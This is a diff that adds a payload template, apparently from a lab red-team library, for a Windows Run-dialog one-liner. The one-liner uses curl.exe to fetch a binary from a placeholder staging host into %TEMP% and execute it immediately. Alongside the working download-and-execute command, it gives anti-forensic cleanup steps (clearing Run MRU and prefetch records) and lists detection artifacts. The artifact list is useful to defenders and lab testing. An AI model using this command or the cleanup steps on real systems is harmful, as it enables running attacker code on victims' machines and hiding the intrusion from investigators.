@@ -1,0 +1,22 @@
+# TEMPLATE: curl-001
+# CLASS: curl.exe download + exec (staged, Run dialog; Win10 1803+)
+# AUTHORIZATION: Authorized lab security research only — see payloads/README.md.
+#   STAGING_HOST must be a lab placeholder (attacker.example / RFC1918 10.x, example-only).
+# PURPOSE: Use the inbox curl.exe (ships in System32 from Windows 10 1803) to
+#   fetch a staged binary to %TEMP% and immediately execute it, all in one
+#   Run-dialog command routed through cmd /c so the && chaining works.
+# PREREQUISITES: Windows 10 1803+ (curl.exe present in System32); outbound
+#   HTTP to STAGING_HOST; OUTPUT_NAME hosted at STAGED_PATH. %TEMP% must be
+#   writable (default). The quoted cmd /c form is required for && chaining.
+# CLEANUP: Delete %TEMP%\<OUTPUT_NAME>; clear Run MRU; remove
+#   C:\Windows\Prefetch\CURL-EXE*.pf and <OUTPUT>-*.pf prefetch records.
+# ARTIFACT: Process: cmd.exe -> curl.exe -> downloaded child process chain.
+# ARTIFACT: File: %TEMP%\<OUTPUT_NAME> written by curl.exe.
+# ARTIFACT: Network: HTTP GET to STAGING_HOST with curl's default
+#   User-Agent (curl/x.y.z) — distinctive vs browser traffic.
+# ARTIFACT: Registry: RunMRU value contains the full command string.
+# ARTIFACT: Prefetch: CURL-EXE prefetch record if prefetch enabled.
+# ARTIFACT: Zone.Identifier ADS on the downloaded file if the server supplies
+#   it (curl does not add MotW by default — verify per lab build).
+# ---
+cmd /c "curl.exe -sS -o %TEMP%\<OUTPUT_NAME> http://<STAGING_HOST>/<STAGED_PATH>/<OUTPUT_NAME> && %TEMP%\<OUTPUT_NAME>"
